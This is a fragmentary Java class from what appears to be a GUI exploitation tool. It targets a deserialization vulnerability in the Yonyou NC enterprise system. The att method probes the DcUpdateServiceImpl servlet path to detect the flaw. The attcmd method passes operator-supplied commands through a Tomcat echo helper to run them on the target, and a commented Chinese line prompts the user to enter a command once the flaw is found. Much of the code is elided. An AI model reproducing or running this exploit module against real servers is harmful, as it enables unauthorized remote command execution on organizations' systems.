...
public class yongyou_nc_dcupdateService_serial implements Exploitlnterface {
    @Override
...
//        return null;
    ...
    private Boolean att(String url, TextArea textArea) {
        try {
            ...
            Response post_res = HttpTools.get(url + "/servlet/~uapbs/uap.bs.dc.file.service.impl.DcUpdateServiceImpl" , head, "utf-8");
            if (post_res.getCode() != 404 && post_res.getCode() != 0) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_nc_dcupdateService_serial ]");
    ...
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        ...
        try {
            String cmd_echo = Methods.Tomcatecho(url + "/servlet/~uapbs/uap.bs.dc.file.service.impl.DcUpdateServiceImpl",cmd,s);
